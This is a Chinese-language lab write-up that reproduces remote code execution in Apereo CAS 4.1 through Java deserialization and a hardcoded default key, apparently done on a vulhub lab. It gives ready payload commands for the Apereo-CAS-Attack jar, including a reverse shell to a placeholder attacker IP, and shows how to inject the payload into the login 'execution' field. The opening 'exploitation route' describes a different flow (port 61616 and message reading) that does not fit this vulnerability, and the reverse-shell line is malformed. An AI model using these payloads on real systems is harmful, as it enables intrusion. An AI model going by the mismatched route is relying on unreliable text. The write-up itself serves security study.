# Apereo CAS 4.1反序列化RCE漏洞

###### by ADummy

### 0x00利用路线

​			构造（可以使用ysoserial）可执行命令的序列化对象--->发送给目标61616端口--->访问web管理页面，读取消息，触发漏洞--->代码执行

### 0x01漏洞介绍

​			Apereo CAS是企业级单点登录系统。CAS试图通过Apache Commons Collections库对对象进行反序列化的过程中存在一个问题，该案例引起了RCE漏洞。Apereo Cas一般是用来做身份认证的，所以有一定的攻击面，漏洞的成因是因为key的默认硬编码，导致可以通过反序列化配合Gadget使用。

​			**影响版本**

```
Apereo CAS <= 4.1.7  之后的版本也可以，没看明白，变强了后补充
```

### 0x02漏洞复现

**4.1.7之前的Apereo CAS的现成默认配置使用默认密钥`changeit`**

```
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...
```

**我们可以尝试使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack)生成加密的[ysoserial](https://github.com/frohoff/ysoserial)的序列化对象，然后，从的登录操作中拦截并修改http请求`/cas/login`，将有效负载放入`execution`的值中**

#### **payload：**

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -i >& /dev/tcp/your-ip/8888>&1"
```

​			**登录页面**

![ApereoCAS_4_x反序列化RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ApereoCAS_4_x反序列化RCE_1.png)

​			**生成加密的序列化对象**(JDK1.7会失败，我用的JDK1.8)

![ApereoCAS_4_x反序列化RCE_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ApereoCAS_4_x反序列化RCE_2.jpg)

​			**Burpsuite抓包，修改execution的值**

![ApereoCAS_4_x反序列化RCE_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ApereoCAS_4_x反序列化RCE_3.jpg)

​			**发现 touch  /tmp/success被执行**

![ApereoCAS_4_x反序列化RCE_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ApereoCAS_4_x反序列化RCE_4.jpg)

​			**攻击机未接到shell(不知道什么问题)**



### 0x03参考资料

https://nosec.org/home/detail/4131.html

